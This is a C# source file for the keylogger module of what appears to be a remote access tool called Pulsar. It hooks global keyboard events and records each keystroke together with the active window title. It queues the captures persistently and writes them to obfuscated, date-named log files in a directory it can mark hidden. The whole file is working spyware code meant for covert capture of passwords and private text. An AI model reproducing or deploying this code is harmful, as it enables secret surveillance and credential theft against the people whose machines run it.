using Gma.System.MouseKeyHook;
using Pulsar.Client.Config;
using Pulsar.Client.Extensions;
using Pulsar.Client.Helper;
using Pulsar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Pulsar.Client.Logging
{
    /// <summary>
    /// This class provides keylogging functionality with persistent queue support.
    /// </summary>
    public class Keylogger : IDisposable
    {
        public bool IsDisposed { get; private set; }

        private readonly Timer _timerFlush;
        private readonly Timer _timerProcessQueue;
        private readonly StringBuilder _logFileBuffer = new StringBuilder();
        private readonly List<Keys> _pressedKeys = new List<Keys>();
        private readonly List<char> _pressedKeyChars = new List<char>();
        private readonly PersistentQueue<LogEntry> _persistentQueue;
        private string _lastWindowTitle = string.Empty;
        private bool _ignoreSpecialKeys;
        private readonly IKeyboardMouseEvents _mEvents;
        private readonly long _maxLogFileSize;
        private readonly object _bufferLock = new object();

        /// <summary>
        /// Represents a log entry to be persisted.
        /// </summary>
        private class LogEntry
        {
            public string Content { get; set; }
            public DateTime Timestamp { get; set; }
        }

        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _mEvents = Hook.GlobalEvents();

            string queuePath = Path.Combine(Settings.LOGSPATH, "queue");
            _persistentQueue = new PersistentQueue<LogEntry>(
                queuePath,
                entry => $"{entry.Timestamp:o}|{entry.Content}",
                str =>
                {
                    var parts = str.Split(new[] { '|' }, 2);
                    return new LogEntry
                    {
                        Timestamp = DateTime.Parse(parts[0], null, DateTimeStyles.RoundtripKind),
                        Content = parts.Length > 1 ? parts[1] : string.Empty
                    };
                }
            );

            _timerFlush = new Timer { Interval = flushInterval };
            _timerFlush.Elapsed += TimerFlushElapsed;

            _timerProcessQueue = new Timer { Interval = 5000 };
            _timerProcessQueue.Elapsed += TimerProcessQueueElapsed;

            ProcessPersistentQueue();
        }

        public void Start()
        {
            Subscribe();
            _timerFlush.Start();
            _timerProcessQueue.Start();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed)
                return;

            if (disposing)
            {
                Unsubscribe();
                _timerFlush.Stop();
                _timerFlush.Dispose();
                _timerProcessQueue.Stop();
                _timerProcessQueue.Dispose();
                _mEvents.Dispose();

                FlushToQueue();

                ProcessPersistentQueue();

                _persistentQueue.Dispose();
            }

            IsDisposed = true;
        }

        private void Subscribe()
        {
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        private void Unsubscribe()
        {
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                lock (_bufferLock)
                {
                    _lastWindowTitle = activeWindowTitle;
                    _logFileBuffer.AppendLine();
                    _logFileBuffer.AppendLine();
                    _logFileBuffer.AppendLine($"[{activeWindowTitle} - {DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)} UTC]");
                    _logFileBuffer.AppendLine();
                }
            }

            if (_pressedKeys.ContainsModifierKeys())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var keyChar = e.KeyChar.ToString();
                if (!string.IsNullOrEmpty(keyChar))
                {
                    Debug.WriteLine("OnKeyPress Output: " + keyChar);
                    if (_pressedKeys.ContainsModifierKeys())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);

                    lock (_bufferLock)
                    {
                        _logFileBuffer.Append(keyChar);
                    }
                }
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            lock (_bufferLock)
            {
                _logFileBuffer.Append(FormatSpecialKeys(_pressedKeys.ToArray()));
            }
            _pressedKeyChars.Clear();
        }

        private bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        private string FormatSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = keys[i].GetDisplayName();
                    Debug.WriteLine("FormatSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.ContainsModifierKeys())
            {
                StringBuilder specialKeys = new StringBuilder();
                int validSpecialKeys = 0;

                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;
                    specialKeys.Append((validSpecialKeys == 0) ? $"[{names[i]}" : $" + {names[i]}");
                    validSpecialKeys++;
                }

                if (validSpecialKeys > 0)
                    specialKeys.Append("]");

                Debug.WriteLineIf(specialKeys.Length > 0, "FormatSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.AppendLine();
                        normalKeys.Append("[Enter]");
                        break;
                    case "Escape":
                        normalKeys.Append("[Esc]");
                        break;
                    default:
                        normalKeys.Append($"[{names[i]}]");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "FormatSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        /// <summary>
        /// Flushes memory buffer to persistent queue.
        /// </summary>
        private void TimerFlushElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            FlushToQueue();
        }

        /// <summary>
        /// Processes items from persistent queue to disk.
        /// </summary>
        private void TimerProcessQueueElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            ProcessPersistentQueue();
        }

        /// <summary>
        /// Flushes the memory buffer to the persistent queue.
        /// </summary>
        private void FlushToQueue()
        {
            lock (_bufferLock)
            {
                if (_logFileBuffer.Length > 0)
                {
                    var entry = new LogEntry
                    {
                        Content = _logFileBuffer.ToString(),
                        Timestamp = DateTime.UtcNow
                    };

                    _persistentQueue.Enqueue(entry);
                    _logFileBuffer.Clear();

                    Debug.WriteLine($"Flushed to queue. Queue size: {_persistentQueue.Count}");
                }
            }
        }

        /// <summary>
        /// Processes all items in the persistent queue and writes them to disk.
        /// </summary>
        private void ProcessPersistentQueue()
        {
            int processedCount = 0;

            while (_persistentQueue.TryDequeue(out LogEntry entry))
            {
                WriteEntryToFile(entry);
                processedCount++;

                if (processedCount >= 100)
                    break;
            }

            if (processedCount > 0)
            {
                Debug.WriteLine($"Processed {processedCount} queue items. Remaining: {_persistentQueue.Count}");
            }
        }

        /// <summary>
        /// Writes a log entry to disk.
        /// </summary>
        private void WriteEntryToFile(LogEntry entry)
        {
            bool writeHeader = false;
            string filePath = Path.Combine(Settings.LOGSPATH, entry.Timestamp.ToString("yyyy-MM-dd"));

            try
            {
                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);

                if (!di.Exists)
                    di.Create();

                if (Settings.HIDELOGDIRECTORY)
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                int i = 1;
                while (File.Exists(filePath))
                {
                    long length = new FileInfo(filePath).Length;
                    if (length < _maxLogFileSize)
                        break;

                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
                    i++;
                }

                if (!File.Exists(filePath))
                    writeHeader = true;

                StringBuilder logFile = new StringBuilder();

                if (writeHeader)
                {
                    logFile.AppendLine($"Log created on {entry.Timestamp.ToString("f", DateTimeFormatInfo.InvariantInfo)} UTC");
                    logFile.AppendLine();
                }

                logFile.Append(entry.Content);

                FileHelper.WriteObfuscatedLogFile(filePath, logFile.ToString());

                logFile.Clear();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to write log file: {ex.Message}");

                _persistentQueue.Enqueue(entry);
            }
        }
    }
}